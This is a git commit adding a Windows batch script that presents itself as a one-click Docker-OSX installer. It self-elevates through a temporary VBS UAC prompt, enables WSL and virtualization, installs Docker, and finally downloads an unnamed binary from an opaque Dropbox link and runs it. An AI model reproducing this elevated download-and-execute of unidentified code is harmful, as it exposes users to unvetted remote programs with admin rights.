bb53fce2c51931d94cc72351f08f59636509efbe
CodeFoxy <96522178+CodeFoxy-Github@users.noreply.github.com>
2024-04-17 20:38:52 +0800

    Add files via upload

---
+++ oneclick-docker-osx-install.bat
@@ -0,0 +1,60 @@
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------    
+echo Updateing WSL...
+echo it takes about 5 min if you this window is in background or your wifi bad
+powershell Invoke-WebRequest -Uri "https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" -OutFile wsl_update_x64.msi
+echo req(dev)
+wsl_update_x64.msi /passive
+echo Installing WSL...
+rem Enable WSL
+dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
+
+rem Enable Virtual Machine Platform (required for WSL 2)
+dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
+wsl --set-default-version 2
+echo when it shows Unix username slowey press 5 times enter
+echo and press CTRL+C
+echo press N
+echo when it shows "root@your pc name" type exit and press enter
+echo or if nothing shows press enter
+echo [wsl2] > .wslconfig
+echo nestedVirtualization=true >> .wslconfig
+rem Install a Linux distribution 
+wsl --install -d Ubuntu
+echo WSL installation completed.
+echo installing docker 
+wsl sudo apt -y install bridge-utils cpu-checker libvirt-clients libvirt-daemon qemu qemu-kvm
+wsl curl -fsSL https://get.docker.com -o get-docker.sh
+wsl sh get-docker.sh
+wsl sudo dockerd
+wsl wget https://ucf29bcb928b9f1aac10259547a6.dl.dropboxusercontent.com/cd/0/inline/CRNm7EEcHTHmg6eOPsQEqdtrmcgy3LOvdmiZb1HzIIT2JAfSvqm07sC4FAJlU-Q4F0u8yxr8w4GL0AjhvpYEaC_GKZ-5mYjr2IG447Pw7mrdiuHb6b4zzqQ7twewc4iBAvJyngUr65S30Kzwa4aefPdO/file#
+WSL chmod +x file
+wsl ./file
